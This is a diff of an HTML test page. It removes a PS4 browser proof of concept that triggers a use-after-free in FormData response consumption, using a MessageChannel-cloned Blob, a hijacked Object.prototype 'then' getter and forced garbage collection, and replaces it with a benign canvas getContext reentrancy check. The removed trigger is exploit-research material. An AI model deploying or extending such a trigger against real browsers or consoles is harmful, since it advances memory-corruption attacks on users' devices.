@@ -1,102 +1,76 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>FormDataConsumer UAF - PS4 PoC</title>
+  <meta charset="utf-8">
+  <title>PS4 Canvas 2D Reentrancy Check</title>
 </head>
 <body>
-<pre id="log"></pre>
-<script>
-function log(msg) {
-    document.getElementById('log').textContent += msg + '\n';
-    console.log(msg);
-}
+  <button id="runBtn" type="button">Executar teste getContext("2d")</button>
+  <pre id="out"></pre>
 
-function gc() {
-    function gcRec(n) {
-          if (n < 1)
-              return {};
-          var temp = {i: "ab" + i + (i / 100000)};
-          temp += "foo";
-          gcRec(n-1);
-    }
-    for (var i = 0; i < 10000; i++)
-    gcRec(10);
-}
+  <script>
+    (function () {
+      const out = document.getElementById("out");
+      const btn = document.getElementById("runBtn");
 
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
+      function log(msg) {
+        out.textContent += msg + "\n";
+      }
 
-function createClonedBlob() {
-    return new Promise(function(resolve, reject) {
-        var channel = new MessageChannel();
+      function runTest() {
+        out.textContent = "";
+        log("Iniciando teste de canvas.getContext('2d')...");
 
-        channel.port1.onmessage = function(e) {
-            gc();
-            resolve(e.data);
-        };
-
-        channel.port1.onmessageerror = function() {
-            reject(new Error('MessageChannel clone failed'));
-        };
-
-        channel.port2.postMessage(new Blob(['aa']));
-    });
-}
-
-function cleanupPrototype() {
-    try {
-        delete Object.prototype.then;
-    } catch(e) {
-        // Se delete falhar (non-configurable), redefine como undefined
         try {
-            Object.defineProperty(Object.prototype, 'then', {
-                value: undefined,
-                configurable: true,
-                writable: true
-            });
-        } catch(e2) {}
-    }
-}
+          const canvas = document.createElement("canvas");
+          canvas.width = 128;
+          canvas.height = 128;
 
-async function triggerUAF() {
-    log('[*] Criando Blob clonado via MessageChannel...');
-    var blob = await createClonedBlob();
-    log('[*] Blob clonado recebido: ' + blob.size + ' bytes');
+          const ctx1 = canvas.getContext("2d");
+          log("ctx1 criado: " + (ctx1 ? ctx1.constructor.name : "null"));
 
-    await sleep(100);
+          const ctx2 = canvas.getContext("2d");
+          log("ctx2 === ctx1: " + (ctx2 === ctx1));
 
-    var formData = new FormData();
-    formData.append('a', blob);
-    log('[*] FormData construído com o blob');
+          const glAttempt = canvas.getContext("webgl");
+          log("getContext('webgl') apos 2d: " + (glAttempt === null ? "null (esperado)" : typeof glAttempt));
 
-    var response = new Response(formData);
-    log('[*] Response criado, armando prototype getter...');
+          // Teste de reentrancia via getter/setter ou evento durante mutacao de tamanho
+          let reentrantCtx = null;
+          const observerCanvas = document.createElement("canvas");
+          observerCanvas.width = 64;
+          observerCanvas.height = 64;
 
-    Object.defineProperty(Object.prototype, 'then', {
-        get: function() {
-            log('[!] Getter .then disparado — nullando response e chamando gc()');
-            response = null;
-            gc();
-            return undefined;
-        },
-        configurable: true,  // permite deletar/redefinir depois
-        enumerable:   false
-    });
+          Object.defineProperty(observerCanvas, "width", {
+            configurable: true,
+            get: function () {
+              return 64;
+            },
+            set: function (val) {
+              if (!reentrantCtx) {
+                reentrantCtx = observerCanvas.getContext("2d");
+              }
+              observerCanvas.setAttribute("width", String(val));
+            }
+          });
 
-    log('[*] Chamando response.arrayBuffer() — iniciando consume...');
-    response.arrayBuffer();
+          observerCanvas.width = 100;
+          const afterCtx = observerCanvas.getContext("2d");
+          log("reentrantCtx === afterCtx: " + (reentrantCtx === afterCtx));
 
-    await sleep(1000);
+          // Operacao basica no buffer para verificar estabilidade
+          ctx1.fillStyle = "#00ff00";
+          ctx1.fillRect(0, 0, 32, 32);
+          canvas.width = 256;
+          ctx1.fillRect(0, 0, 16, 16);
+          log("Resize + draw concluido sem excecao.");
+        } catch (err) {
+          log("Excecao capturada: " + (err && err.message ? err.message : String(err)));
+        }
+      }
 
-    cleanupPrototype();
-    log('[*] Concluído sem crash aparente (bug pode estar patchado ou timing errado)');
-}
-
-triggerUAF().catch(function(e) {
-    cleanupPrototype();
-    log('[!] Erro: ' + e.message);
-});
-</script>
+      btn.addEventListener("click", runTest);
+    })();
+  </script>
 </body>
 </html>
